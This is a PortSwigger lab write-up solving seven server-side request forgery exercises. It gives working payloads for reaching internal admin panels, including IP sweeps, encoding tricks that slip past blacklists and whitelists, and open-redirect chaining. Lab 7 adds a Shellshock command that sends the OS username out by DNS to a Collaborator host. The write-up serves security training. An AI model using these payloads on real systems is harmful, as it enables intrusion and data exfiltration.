# Server Side Request Forgery (SSRF)

## Lab 1: Basic SSRF against the local server

### Sol :

Try by adding `/admin` in the URL as it doesn't allow access for admin's page.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/6f1962d1-5771-4484-a46e-3d7d1cbbe8ea)

Check stock of any product and intercept the request from the proxy.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a38993bd-7183-4856-9620-d73969814389)

In the `stockApi` parameter give `http://localhost/admin` payload to access the admin's panel.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9fe974df-0091-493d-b6a5-ac706833dcfa)

Find the `/admin/delete?username=carlos` at response side and give it to the `stockApi` parameter and run it.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/47e43736-15a7-497e-9fa8-39402e0a3712)

This will delete the user `carlos` as the request done through localhost and the lab is solved.

## Lab 2: Basic SSRF against another back-end system

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

### Sol :

Intercept the stock check request and send it to Intruder. (Clearing payload symbols)

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/c0c487c5-478e-4521-95c3-8fc3364dbb99)

CHange the `stockApi` parameter to `http://192.168.0.1:8080/admin` and give payload symbol to the last octet (`1`).

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0577c59e-e109-485c-ab00-40f2ed66b9d6)

Under payload settings, give `Numbers` from `1-255` and start the attack.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a53165ed-5062-4a51-9371-f419b0b51d67)

We will get `200` as status code for the correct number

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/94f157c9-ca72-419f-9676-37e745d95d54)

Change the `stockApi` parameter value to the value of which we found and add `/admin/delete?username=carlos` to it.

The total paramter value will be `http://192.168.0.219:8080/admin/delete?username=carlos`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/492e7beb-8f45-4cfc-a8a5-756f05fd71ae)

Thus, lab is solved.

## Lab 3: SSRF with blacklist-based input filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

### Sol :

Check the stock of any product and intercept the request.

Try placing `http://127.0.0.1/` at `stockApi` parameter. It will block this request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/daa35a77-37e2-4c91-a5ae-75c7813d6f7d)

If we give `http://127.1/` at `stockApi` parameter. It will bypass the blacklist and we will get the response.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/230958f8-9cfd-4278-99d0-b3963109bcbb)

If we give `http:/127.1/admin` then again it will block the request as `admin` given.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/205909df-0dae-4fb0-92df-f7f51ab9f6b5)

If we encode starting letter `a` as `%2561` then it will allow the request as we got the response and deleting user link is given.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a8567664-4129-4f76-af3f-a370390c8000)

If we give `http://127.1/%2561dmin/delete?username=carlos` it will delete the user and lab is solved.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/dbe823c1-6808-4171-9703-7f7a1b5245ce)

## Lab 4: SSRF with whitelist-based input filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.

### Sol :

Check the product stock and intercept the request. We will get the `stockApi` parameter.

Now give `stockApi` parameter value as `http://127.0.0.1/` and run the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/e52e0581-99e8-4e48-b1bd-934b02f8e045)

It will shows as `Bad Request`.

Now change it to `http://username@stock.weliketoshop.net/` and run the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/24d6c659-fad7-4f5c-b6bb-145f5e3baa51)

It will show as `Internal Server Error` indicating that the URL parser supports embedded credentials.

Append a # to the username and observe that the URL is now rejected.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0a5ce00b-8dea-401d-93f8-c59b69210b35)

Now change the `#` as `%2523` as encoded form.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/8dca60b0-d020-400b-bff4-8e9afb4c0ae2)

It shows Internal Server Error  indicating that the server may have attempted to connect to `username`.

To access and delete a user as admin, give the below payload in the `stockApi` parameter.

      http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/97c51288-7d04-4f79-b4f7-04dcb75be04b)

Thus, the lab is solved.

## Lab 5: SSRF with filter bypass via open redirection vulnerability

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

### Sol :

Check the stock of a product and intercept the request using burpsuite and send it to the repeater.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d2928bc8-5241-4b08-9f93-57252e29d092)

Tamper with `stockApi` parameter by passing request as admin's access by giving `http://192.168.0.12:8080/admin` as parameter value.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/744ff51e-d5b5-4e82-b81a-00bbda2fa0b7)

It says `Bad Request`.

Click `next product` and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/5f4209b3-0eed-4068-9e79-bfa6e74b77a8)

Feed the below payload to the `stockApi` parameter that exploits the open redirection vulnerability, and redirects to the admin interface

      /product/nextProduct?path=http://192.168.0.12:8080/admin

It will give us admin interface.

Amend the path to delete the target user:

      /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
      
![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d072b3da-1c49-41df-95ec-e7cbfb2cf003)

Thus, the lab is solved.
![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/e88a8e87-3250-4ff2-b3cc-7d5c1e8a4f82)

## Lab 6: Blind SSRF with out-of-band detection

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

### Sol :

* Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
* Go to the Repeater tab. Select the Referer header, right-click and select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain. Send the request.
* Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
* You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

## Lab 7: Blind SSRF with Shellshock exploitation

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

### Sol :

* In `Burp Suite Professional`, install the `Collaborator Everywhere` extension from the BApp Store.
* Add the domain of the lab to Burp Suite's `target scope`, so that Collaborator Everywhere will target it.
* Browse the site.
* Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
* Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
* Send the request to the product page to Burp Intruder.
* Go to the `Collaborator` tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:

      () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN

* Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
* Click "Clear §", change the Referer header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number 1), click "Add §"
* Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
* Click "Start attack".
* When the attack is finished, go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
* To complete the lab, enter the name of the OS user
